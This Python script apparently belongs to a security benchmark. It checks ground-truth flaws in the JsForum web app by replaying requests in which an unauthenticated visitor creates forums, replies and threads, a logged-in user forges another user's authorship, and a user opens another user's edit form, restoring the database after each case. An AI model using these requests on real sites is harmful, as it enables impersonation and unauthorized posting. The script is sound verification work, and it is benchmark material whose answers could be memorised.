"""Manual ground-truth verification for JsForum (GT-039 .. GT-044).

The AddForum / AddReply / AddThread servlets contain no session check at all
and take the message author from a request parameter; editmessage.jsp renders
the edit form of any message to any authenticated session without an
ownership check.
"""

from __future__ import annotations

import json

import verifier as v

APP = "jsforum"
FORUM_ID = "7"
THREAD_ID = "21"


def _max(column: str, table: str, where: str) -> str:
    return f"SELECT COALESCE(MAX({column}), 0) FROM {table} {where}"


def gt039(det, db) -> dict:
    """servlet/forum.AddForum — visitor creates a forum (token row)."""
    r = v.Recorder(APP, "GT-039", db)
    tok = v.token("forum")
    lastforum_id = db.scalar("SELECT COALESCE(MAX(forum_id), 0) FROM forum_forums")
    r.add("instrument", {"table": "forum_forums", "token_title": tok, "lastforum_id": lastforum_id})
    sess = v.role_session(det, "visitor")
    try:
        resp = v.replay(det, sess, "servlet/forum.AddForum", {
            "method": "POST",
            "params": {"lastforum_id": lastforum_id, "title": tok, "forum_info": "drhlgt"},
            "referer": "forum/index.jsp",
        })
        created = bool(db.scalar(f"SELECT COUNT(*) FROM forum_forums WHERE title='{tok}'"))
        r.add("replay", {
            "role": "visitor (no login)",
            "request": f"POST servlet/forum.AddForum title={tok}",
            "status_code": resp["status_code"],
            "forum_row_created": created,
        })
    finally:
        v.close_session(sess)
    verdict = "vulnerable" if created else "not_confirmed"
    summary = (f"visitor POST servlet/forum.AddForum returned {resp['status_code']}; a forum row with the "
               f"token title was created in the forum database (created={created}).")
    return r.finish(verdict, summary)


def _reply_params(db) -> tuple[dict, str]:
    last_reply = db.scalar(_max("reply_id", "forum_message",
                                f"WHERE forum_id={FORUM_ID} AND thread_id={THREAD_ID}"))
    return {"start": "0", "forum_id": FORUM_ID, "lastReply_id": last_reply,
            "thread_id": THREAD_ID, "message": "", "user": ""}, last_reply


def _thread_params(db) -> tuple[dict, str]:
    last_thread = db.scalar(_max("thread_id", "forum_threads", f"WHERE forum_id={FORUM_ID}"))
    return {"forum_id": FORUM_ID, "lastThread_id": last_thread,
            "title": "", "message": "", "user": ""}, last_thread


def gt040(det, db) -> dict:
    """servlet/forum.AddReply — visitor creates a reply (token row)."""
    r = v.Recorder(APP, "GT-040", db)
    tok = v.token("reply")
    base, _ = _reply_params(db)
    r.add("instrument", {"table": "forum_message", "token_message": tok,
                         "forum_id": FORUM_ID, "thread_id": THREAD_ID})
    sess = v.role_session(det, "visitor")
    try:
        resp = v.replay(det, sess, "servlet/forum.AddReply", {
            "method": "POST",
            "params": {**base, "message": tok, "user": "drhlgt"},
            "referer": f"forum/index.jsp?page=message&forum_id={FORUM_ID}&thread_id={THREAD_ID}&start=0",
        })
        created = bool(db.scalar(f"SELECT COUNT(*) FROM forum_message WHERE message='{tok}'"))
        r.add("replay", {
            "role": "visitor (no login)",
            "request": f"POST servlet/forum.AddReply message={tok}",
            "status_code": resp["status_code"],
            "reply_row_created": created,
        })
    finally:
        v.close_session(sess)
    verdict = "vulnerable" if created else "not_confirmed"
    summary = (f"visitor POST servlet/forum.AddReply returned {resp['status_code']}; a reply row with the "
               f"token message was created in forum_message (created={created}).")
    return r.finish(verdict, summary)


def gt041(det, db) -> dict:
    """servlet/forum.AddThread — visitor creates a thread (token row)."""
    r = v.Recorder(APP, "GT-041", db)
    tok = v.token("thread")
    base, _ = _thread_params(db)
    r.add("instrument", {"table": "forum_threads", "token_title": tok, "forum_id": FORUM_ID})
    sess = v.role_session(det, "visitor")
    try:
        resp = v.replay(det, sess, "servlet/forum.AddThread", {
            "method": "POST",
            "params": {**base, "title": tok, "message": "drhlgt message", "user": "drhlgt"},
            "referer": f"forum/index.jsp?page=thread&forum_id={FORUM_ID}",
        })
        created = bool(db.scalar(f"SELECT COUNT(*) FROM forum_threads WHERE title='{tok}'"))
        r.add("replay", {
            "role": "visitor (no login)",
            "request": f"POST servlet/forum.AddThread title={tok}",
            "status_code": resp["status_code"],
            "thread_row_created": created,
        })
    finally:
        v.close_session(sess)
    verdict = "vulnerable" if created else "not_confirmed"
    summary = (f"visitor POST servlet/forum.AddThread returned {resp['status_code']}; a thread row with "
               f"the token title was created in forum_threads (created={created}).")
    return r.finish(verdict, summary)


def _forged_author(gt_id, endpoint, params_builder, tok_label, db, det, thread_case=False) -> dict:
    """HPE variant: logged in as user1, the author parameter is set to user2;
    the created content must carry user2 as author."""
    r = v.Recorder(APP, gt_id, db)
    tok = v.token(tok_label)
    base, _ = params_builder(db)
    r.add("instrument", {"token": tok, "attacker_session_user": "user1",
                         "forged_author_param": "user2"})
    sess = v.role_session(det, "user1")
    try:
        if thread_case:
            params = {**base, "title": tok, "message": tok, "user": "user2"}
        else:
            params = {**base, "message": tok, "user": "user2"}
        resp = v.replay(det, sess, endpoint, {
            "method": "POST",
            "params": params,
            "referer": "forum/index.jsp",
        })
        if thread_case:
            thread = db.rows(f"SELECT thread_id FROM forum_threads WHERE title='{tok}' LIMIT 1")
            created = bool(thread)
            if created:
                new_thread_id = thread[0][0]
                msg = db.rows(f"SELECT user FROM forum_message WHERE forum_id={FORUM_ID} AND "
                              f"thread_id={new_thread_id} AND reply_id='0' LIMIT 1")
                author = msg[0][0] if msg else ""
            else:
                author = ""
        else:
            row = db.rows(f"SELECT user FROM forum_message WHERE message='{tok}' LIMIT 1")
            created = bool(row)
            author = row[0][0] if row else ""
        r.add("replay", {
            "role": "user1 (logged-in session)",
            "request": f"POST {endpoint} user=user2 message={tok}",
            "status_code": resp["status_code"],
            "row_created": created,
            "row_author": author,
            "author_forged_to_user2": (author == "user2"),
        })
    finally:
        v.close_session(sess)
    verdict = "vulnerable" if author == "user2" else "not_confirmed"
    summary = (f"user1 POST {endpoint} with the user parameter set to user2 returned "
               f"{resp['status_code']}; the created content carries user2 as its author although the "
               f"session belongs to user1 (author_forged={author == 'user2'}).")
    return r.finish(verdict, summary)


def gt042(det, db) -> dict:
    """servlet/forum.AddReply with user=user2 — authorship forgery."""
    return _forged_author("GT-042", "servlet/forum.AddReply", _reply_params,
                          "reply_forge", db, det)


def gt043(det, db) -> dict:
    """servlet/forum.AddThread with user=user2 — authorship forgery (the
    initial message of the created thread carries user2 as author)."""
    return _forged_author("GT-043", "servlet/forum.AddThread", _thread_params,
                          "thread_forge", db, det, thread_case=True)


def gt044(det, db) -> dict:
    """forum/editmessage.jsp — user1 opens the edit interface of a reply
    authored by user2; the form renders user2's message content (HPE). The
    ChangeMessage write itself is owner-gated, which bounds the impact."""
    r = v.Recorder(APP, "GT-044", db)
    tok = v.token("usermsg")
    last_reply = db.scalar(f"SELECT COALESCE(MAX(reply_id), 0) FROM forum_message "
                           f"WHERE forum_id={FORUM_ID} AND thread_id={THREAD_ID}")
    reply_id = str(int(last_reply) + 1)
    db.execute(
        f"INSERT INTO forum_message (forum_id, thread_id, reply_id, message, user, date_time) "
        f"VALUES ({FORUM_ID}, {THREAD_ID}, {reply_id}, '{tok}', 'user2', NOW())"
    )
    r.add("instrument", {"table": "forum_message",
                         "row": f"forum_id={FORUM_ID}, thread_id={THREAD_ID}, reply_id={reply_id}",
                         "message_token": tok, "author": "user2",
                         "note": "documented precondition: a reply authored by user2 was inserted for the "
                                 "test (the database baseline was restored after the record)"})
    sess = v.role_session(det, "user1")
    try:
        resp = v.replay(det, sess, f"forum/editmessage.jsp?forum_id={FORUM_ID}&thread_id={THREAD_ID}"
                                  f"&reply_id={reply_id}&start=0", {
            "method": "GET",
            "params": {"forum_id": FORUM_ID, "thread_id": THREAD_ID, "reply_id": reply_id, "start": "0"},
            "referer": None,
        })
        exposed = tok in resp["body"]
        body_file = r.save_body("gt044_user1_editmessage", resp["body"])
        # The write path: submitting the form does NOT change user2's message
        # (the UPDATE is owner-gated for non-admin users).
        change = v.replay(det, sess, "servlet/forum.ChangeMessage", {
            "method": "POST",
            "params": {"start": "0", "forum_id": FORUM_ID, "thread_id": THREAD_ID,
                       "reply_id": reply_id, "message": "forged"},
            "referer": f"forum/editmessage.jsp?forum_id={FORUM_ID}&thread_id={THREAD_ID}"
                       f"&reply_id={reply_id}&start=0",
        })
        after = db.scalar(f"SELECT message FROM forum_message WHERE forum_id={FORUM_ID} "
                          f"AND thread_id={THREAD_ID} AND reply_id={reply_id} LIMIT 1")
        r.add("replay", {
            "role": "user1 (logged-in session, not the reply author)",
            "request": f"GET forum/editmessage.jsp?forum_id={FORUM_ID}&thread_id={THREAD_ID}"
                       f"&reply_id={reply_id}",
            "status_code": resp["status_code"],
            "other_users_message_token_exposed_in_edit_form": exposed,
            "body_saved": body_file,
            "change_submit_status": change["status_code"],
            "db_message_after_submit": after,
            "write_remained_owner_gated": (after == tok),
        })
    finally:
        v.close_session(sess)
    verdict = "vulnerable" if exposed else "not_confirmed"
    summary = (f"user1 GET forum/editmessage.jsp for user2's reply returned {resp['status_code']}; the "
               f"edit form rendered user2's message content (token exposed={exposed}); the submitted "
               f"ChangeMessage left the row unchanged (write owner-gated={after == tok}), bounding the "
               f"impact to the unauthorized edit-interface access.")
    return r.finish(verdict, summary)


def main() -> None:
    cfg, snap, det, db = v.app_context(APP)
    baseline = snap.create()
    results = []
    for fn in (gt039, gt040, gt041, gt042, gt043, gt044):
        results.append(v.run_record(snap, lambda fn=fn: fn(det, db), baseline, cfg.database))
    (v.app_evidence_dir(APP) / "summary.json").write_text(json.dumps({
        "app": APP,
        "baseline": str(baseline),
        "database_restored_after_each_record": True,
        "restore_verified_per_record": [bool(item.get("restore_verified")) for item in results],
        "final_database_matches_baseline": v.db_matches(cfg.database, baseline),
        "results": results,
    }, ensure_ascii=False, indent=2), encoding="utf-8")
    for item in results:
        print(f"{item['gt_id']}: {item['verdict']} | restored={item.get('restore_verified')} | {item['summary'][:120]}")


if __name__ == "__main__":
    main()
